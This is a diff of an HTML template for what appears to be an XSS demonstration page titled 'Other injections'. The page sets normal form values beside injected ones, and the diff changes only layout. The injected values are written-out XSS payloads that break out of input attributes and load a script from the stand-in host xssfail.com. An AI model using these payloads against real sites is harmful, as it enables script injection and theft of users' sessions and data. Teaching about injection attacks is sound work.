@@ -1,27 +1,12 @@
+{{>doctype}}
 <html>
-    <head></head>
-    <body>
-        <style>
-            body, ul, li { margin:0; padding:0; border:0; }
-            body { min-width:820px; }
-            .instead-of {
-                float:left;
-                width: 40%;
-            }
-            .instead-of strong { color:blue; }
-            .center { float:left; width:20%; }
-            .inject {
-                float:right;
-                width:40%;
-            }
-            .inject strong { color:red; }
-            li { height:150px; }
-        </style>
+    {{>header}}
+    <body class="injections">
+        {{>mainmenu}}
         <h1>Other injections</h1>
         <ul>
             <li>
                 <div class="instead-of">User name: <input value="Eugene" readonly="readonly" /></div>
-                <div class="center">2</div>
                 <div class="inject">User name: <input value="&lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;" readonly="readonly" /></div>
                 <div></div>
                 <div class="instead-of">
@@ -31,7 +16,6 @@
                     <br/>...<br/>
                     &lt;/html&gt;
                 </div>
-                <div class="center">2</div>
                 <div class="inject">
                     &lt;html&gt;
                     <br/>...<br/>
@@ -43,10 +27,9 @@
             </li>
             <li>
                 <div class="instead-of">Country: <input value="UK" readonly="readonly" /></div>
-                <div class="center">2</div>
                 <div class="inject">Country: <input value="
 &quot; onclick=&quot;{d=document;s=d.createElement('script');s.setAttribute('src','http://xssfail.com/xss.js');d.body.appendChild(s)}&quot; x=&quot;" readonly="readonly" /></div>
-                <div></div>
+                <div class="clear"></div>
                 <div class="instead-of">
                     &lt;html&gt;
                     <br/>...<br/>
@@ -54,7 +37,6 @@
                     <br/>...<br/>
                     &lt;/html&gt;
                 </div>
-                <div class="center">2</div>
                 <div class="inject">
                     &lt;html&gt;
                     <br/>...<br/>
@@ -64,14 +46,13 @@
                     <br/>...<br/>
                     &lt;/html&gt;
                 </div>
-                <div></div>
+                <div class="clear"></div>
             </li>
             <li>
                 <div class="instead-of">Country: <input value="UK" readonly="readonly" /></div>
-                <div class="center">2</div>
                 <div class="inject">Country: <input value="
 &quot;&gt;&lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;&lt;a&gt;" readonly="readonly" /></div>
-                <div></div>
+                <div class="clear"></div>
                 <div class="instead-of">
                     &lt;html&gt;
                     <br/>...<br/>
@@ -79,7 +60,6 @@
                     <br/>...<br/>
                     &lt;/html&gt;
                 </div>
-                <div class="center">2</div>
                 <div class="inject">
                     &lt;html&gt;
                     <br/>...<br/>
@@ -89,14 +69,13 @@
                     <br/>...<br/>
                     &lt;/html&gt;
                 </div>
-                <div></div>
+                <div class="clear"></div>
             </li>
             <li>
                 <div class="instead-of">Preffered color: <input value="red" readonly="readonly" /></div>
-                <div class="center">2</div>
                 <div class="inject">Preffered color: <input value="
 &quot; /&gt;&lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;&lt;img src=&quot;" readonly="readonly" /></div>
-                <div></div>
+                <div class="clear"></div>
                 <div class="instead-of">
                     &lt;html&gt;
                     <br/>...<br/>
@@ -104,7 +83,6 @@
                     <br/>...<br/>
                     &lt;/html&gt;
                 </div>
-                <div class="center">2</div>
                 <div class="inject">
                     &lt;html&gt;
                     <br/>...<br/>
@@ -114,7 +92,7 @@
                     <br/>...<br/>
                     &lt;/html&gt;
                 </div>
-                <div></div>
+                <div class="clear"></div>
             </li>
         </ul>
     </body>
